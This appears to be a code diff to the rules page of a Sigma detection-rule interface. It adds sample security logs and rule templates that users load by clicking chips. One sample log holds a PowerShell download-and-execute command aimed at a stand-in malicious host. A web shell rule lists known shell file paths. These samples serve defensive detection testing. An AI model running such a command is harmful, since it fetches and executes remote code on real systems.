@@ -34,6 +34,112 @@ import { getApiUrl, getAuthHeader } from '@/config/api';
 
 const SIGMA_NAMESPACE = 'sigma';
 
+const EXAMPLE_LOGS = [
+  {
+    label: 'PowerShell Download',
+    log: `EventID: 1
+CommandLine: powershell.exe -ep bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')"
+ParentImage: C:\\Windows\\explorer.exe
+Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+User: CORP\\jdoe
+LogonId: 0x3E7`,
+  },
+  {
+    label: 'Suspicious SSH Login',
+    log: `timestamp: 2024-12-15T03:22:41Z
+source: sshd
+message: Failed password for root from 203.0.113.42 port 52341 ssh2
+facility: auth
+severity: warning
+hostname: prod-web-01`,
+  },
+  {
+    label: 'AWS S3 Public Access',
+    log: `{"eventVersion":"1.08","eventSource":"s3.amazonaws.com","eventName":"PutBucketPolicy","awsRegion":"us-east-1","sourceIPAddress":"198.51.100.23","userAgent":"aws-cli/2.13.0","requestParameters":{"bucketName":"sensitive-data-bucket","policy":"{\\"Statement\\":[{\\"Effect\\":\\"Allow\\",\\"Principal\\":\\"*\\",\\"Action\\":\\"s3:GetObject\\"}]}"},"userIdentity":{"arn":"arn:aws:iam::123456789012:user/admin"}}`,
+  },
+  {
+    label: 'Windows RDP Brute Force',
+    log: `EventID: 4625
+LogName: Security
+TargetUserName: Administrator
+IpAddress: 10.0.0.55
+LogonType: 10
+FailureReason: %%2313
+SubStatus: 0xC000006A
+WorkstationName: ATTACKER-PC`,
+  },
+];
+
+const EXAMPLE_RULES = [
+  {
+    label: 'Process Creation',
+    content: `title: Suspicious Process Creation
+id: 
+status: experimental
+level: high
+description: Detects suspicious process creation patterns
+author: SOC Team
+date: ${new Date().toISOString().split('T')[0]}
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith:
+      - '\\cmd.exe'
+      - '\\powershell.exe'
+    ParentImage|endswith:
+      - '\\winword.exe'
+      - '\\excel.exe'
+  condition: selection
+falsepositives:
+  - Legitimate macro usage`,
+  },
+  {
+    label: 'Firewall Block',
+    content: `title: Repeated Firewall Denies from Single Source
+id: 
+status: experimental
+level: medium
+description: Detects a single source IP generating multiple firewall deny events
+author: SOC Team
+date: ${new Date().toISOString().split('T')[0]}
+logsource:
+  category: firewall
+detection:
+  selection:
+    action: denied
+  condition: selection | count(src_ip) by src_ip > 50
+  timeframe: 5m
+falsepositives:
+  - Misconfigured applications
+  - Network scanners`,
+  },
+  {
+    label: 'Web Shell Access',
+    content: `title: Web Shell Detection via URI Pattern
+id: 
+status: experimental
+level: critical
+description: Detects access to known web shell paths
+author: SOC Team
+date: ${new Date().toISOString().split('T')[0]}
+logsource:
+  category: webserver
+detection:
+  selection:
+    cs-uri-stem|contains:
+      - '/cmd.asp'
+      - '/shell.php'
+      - '/c99.php'
+      - '/r57.php'
+    sc-status: 200
+  condition: selection
+falsepositives:
+  - Penetration testing`,
+  },
+];
+
 interface DetectionInfo {
   id: string;
   file_id: string;
@@ -750,6 +856,28 @@ const RulesPage = () => {
                   '& .MuiOutlinedInput-input': { color: 'hsl(var(--foreground))' },
                 }}
               />
+              <Box sx={{ display: 'flex', gap: 0.75, mt: 1, flexWrap: 'wrap' }}>
+                <Typography variant="caption" sx={{ color: 'hsl(var(--muted-foreground))', mr: 0.5, lineHeight: '24px' }}>
+                  Examples:
+                </Typography>
+                {EXAMPLE_LOGS.map((ex) => (
+                  <Chip
+                    key={ex.label}
+                    label={ex.label}
+                    size="small"
+                    onClick={() => setSampleLog(ex.log)}
+                    sx={{
+                      height: 24,
+                      fontSize: '0.7rem',
+                      cursor: 'pointer',
+                      backgroundColor: 'hsl(var(--muted))',
+                      color: 'hsl(var(--primary))',
+                      border: '1px solid hsl(var(--border))',
+                      '&:hover': { backgroundColor: 'hsl(var(--primary) / 0.1)', borderColor: 'hsl(var(--primary))' },
+                    }}
+                  />
+                ))}
+              </Box>
             </Box>
           )}
           <TextField
@@ -771,9 +899,41 @@ const RulesPage = () => {
             }}
           />
           <Box>
-            <Typography variant="body2" sx={{ color: 'hsl(var(--muted-foreground))', mb: 1 }}>
-              Rule Content (YAML)
-            </Typography>
+            <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', mb: 1 }}>
+              <Typography variant="body2" sx={{ color: 'hsl(var(--muted-foreground))' }}>
+                Rule Content (YAML)
+              </Typography>
+              {!editingFile && (
+                <Box sx={{ display: 'flex', gap: 0.75, flexWrap: 'wrap' }}>
+                  <Typography variant="caption" sx={{ color: 'hsl(var(--muted-foreground))', mr: 0.5, lineHeight: '24px' }}>
+                    Templates:
+                  </Typography>
+                  {EXAMPLE_RULES.map((ex) => (
+                    <Chip
+                      key={ex.label}
+                      label={ex.label}
+                      size="small"
+                      onClick={() => {
+                        setRuleContent(ex.content);
+                        const titleMatch = ex.content.match(/^title:\s*(.+)$/m);
+                        if (titleMatch && !ruleName.trim()) {
+                          setRuleName(titleMatch[1].trim().toLowerCase().replace(/\s+/g, '_'));
+                        }
+                      }}
+                      sx={{
+                        height: 24,
+                        fontSize: '0.7rem',
+                        cursor: 'pointer',
+                        backgroundColor: 'hsl(var(--muted))',
+                        color: 'hsl(var(--primary))',
+                        border: '1px solid hsl(var(--border))',
+                        '&:hover': { backgroundColor: 'hsl(var(--primary) / 0.1)', borderColor: 'hsl(var(--primary))' },
+                      }}
+                    />
+                  ))}
+                </Box>
+              )}
+            </Box>
             <TextField
               multiline
               rows={20}
